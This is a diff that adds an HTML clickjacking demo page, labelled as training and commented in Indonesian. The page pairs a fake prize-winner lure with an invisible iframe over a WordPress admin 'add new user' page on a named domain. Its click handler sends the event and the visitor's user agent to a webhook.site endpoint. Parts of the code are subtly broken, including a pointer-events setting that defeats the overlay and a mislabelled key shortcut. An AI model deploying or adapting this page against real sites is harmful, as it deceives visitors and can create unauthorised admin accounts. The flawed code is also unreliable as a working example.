@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Clickjacking - Training</title>
+    <style>
+        /* === TAMPILAN PALSU UNTUK USER === */
+        body {
+            font-family: Arial;
+            background: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .fake-site {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        
+        .winner-banner {
+            background: linear-gradient(45deg, #FF0000, #FF8800);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+        
+        .claim-button {
+            background: #28a745;
+            color: white;
+            padding: 20px 40px;
+            font-size: 24px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            display: block;
+            margin: 30px auto;
+            width: 80%;
+            transition: all 0.3s;
+        }
+        
+        .claim-button:hover {
+            background: #218838;
+            transform: scale(1.05);
+        }
+        
+        /* === IFRAME TERSEMBUNYI === */
+        .hidden-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            opacity: 0.0;
+            z-index: 9999;
+            pointer-events: none;
+        }
+        
+        /* === DEBUG CONSOLE === */
+        .debug-console {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            border-radius: 5px;
+            max-width: 500px;
+            z-index: 10000;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========================================== -->
+    <!-- BAGIAN 1: WEBSITE PALSU (YANG DILIHAT USER) -->
+    <!-- ========================================== -->
+    
+    <div class="fake-site">
+        <div class="winner-banner">
+            <h1>🎉 SELAMAT! ANDA MENANG! 🎉</h1>
+            <p>Anda terpilih sebagai pemenang undian khusus!</p>
+        </div>
+        
+        <h2>📦 HADIAH ANDA:</h2>
+        <ul>
+            <li>💰 <strong>Uang Tunai:</strong> Rp 5.000.000</li>
+            <li>📱 <strong>iPhone 15 Pro Max</strong></li>
+            <li>🎮 <strong>PlayStation 5</strong></li>
+        </ul>
+        
+        <p><strong>⏰ Klaim dalam 5 menit atau hadiah hangus!</strong></p>
+        
+        <!-- BUTTON JEBakanAN -->
+        <button class="claim-button" id="claimButton">
+            🎁 KLIK DISINI UNTUK CLAIM HADIAH!
+        </button>
+        
+        <p style="text-align: center; color: #666; font-size: 12px;">
+            Anda akan diarahkan ke halaman verifikasi
+        </p>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- BAGIAN 2: IFRAME TERSEMBUNYI (SERANGAN) -->
+    <!-- ========================================== -->
+    
+    <!-- GANTI DENGAN WORDPRESS TEST SITE ANDA SENDIRI -->
+    <iframe src="https://rumahtamushofia.my.id/wp-admin/user-new.php" 
+            class="hidden-layer" 
+            id="attackFrame">
+    </iframe>
+
+    <!-- ========================================== -->
+    <!-- BAGIAN 3: KONSOL DEBUG -->
+    <!-- ========================================== -->
+    
+    <div class="debug-console" id="debugConsole">
+        🕵️ DEMO CLICKJACKING - DEBUG MODE<br>
+        ================================<br>
+        Status: <span id="status">READY</span><br>
+        Target: WordPress Admin<br>
+        Action: Create New User<br>
+        <br>
+        Press [V] - Show/hide hidden layer<br>
+        Press [V] - Test webhook<br>
+        <br>
+        <span id="message">Loading...</span>
+    </div>
+
+    <script>
+        // ==========================================
+        // BAGIAN 4: SCRIPT YANG LEBIH SIMPLE
+        // ==========================================
+        
+        console.log('🔓 Clickjacking Demo Loaded');
+        
+        // Update status
+        document.getElementById('status').textContent = 'READY';
+        document.getElementById('message').textContent = 'Click the button above!';
+        
+        // FUNGSI UTAMA: Ketika user klik button hadiah
+        document.getElementById('claimButton').addEventListener('click', function() {
+            console.log('🎯 User clicked the button!');
+            
+            // Update UI
+            document.getElementById('status').textContent = 'ATTACK TRIGGERED';
+            document.getElementById('message').textContent = 'Button clicked! Attack simulated.';
+            
+            // Simpan click ke webhook (jika ada)
+            try {
+                const webhookURL = "https://webhook.site/3dfed081-c1a9-4c24-a5b4-dac8fb673451";
+                const data = {
+                    event: 'BUTTON_CLICKED',
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                };
+                
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                }).then(() => {
+                    console.log('✅ Webhook sent');
+                });
+            } catch (e) {
+                console.log('⚠️ Webhook failed: ' + e.message);
+            }
+            
+            // Tampilkan alert demo
+            setTimeout(function() {
+                alert('🚨 DEMO BERHASIL!\n\nJika admin WordPress sedang login:\n• User admin baru akan dibuat\n• Hak akses administrator\n• Tanpa sepengetahuan admin!\n\nIni membuktikan kerentanan clickjacking!');
+                
+                document.getElementById('message').textContent = 'Demo completed! Check webhook.';
+            }, 1000);
+        });
+        
+        // Keyboard shortcuts untuk demo
+        document.addEventListener('keydown', function(event) {
+            const iframe = document.getElementById('attackFrame');
+            
+            // [V] - Tampilkan/sembunyikan iframe
+            if (event.key === 'v' || event.key === 'V') {
+                iframe.style.opacity = iframe.style.opacity === '0.5' ? '0.0' : '0.5';
+                document.getElementById('message').textContent = 
+                    'Iframe: ' + (iframe.style.opacity === '0.5' ? 'VISIBLE' : 'HIDDEN');
+            }
+            
+            // [W] - Test webhook
+            if (event.key === 'w' || event.key === 'W') {
+                document.getElementById('message').textContent = 'Testing webhook...';
+                console.log('Testing webhook...');
+            }
+        });
+        
+        // Handle iframe load
+        document.getElementById('attackFrame').onload = function() {
+            document.getElementById('message').textContent = 'Hidden frame loaded! Click button.';
+        };
+        
+        document.getElementById('attackFrame').onerror = function() {
+            document.getElementById('message').textContent = 'Iframe failed to load (normal for demo)';
+        };
+        
+    </script>
+
+</body>
+</html>
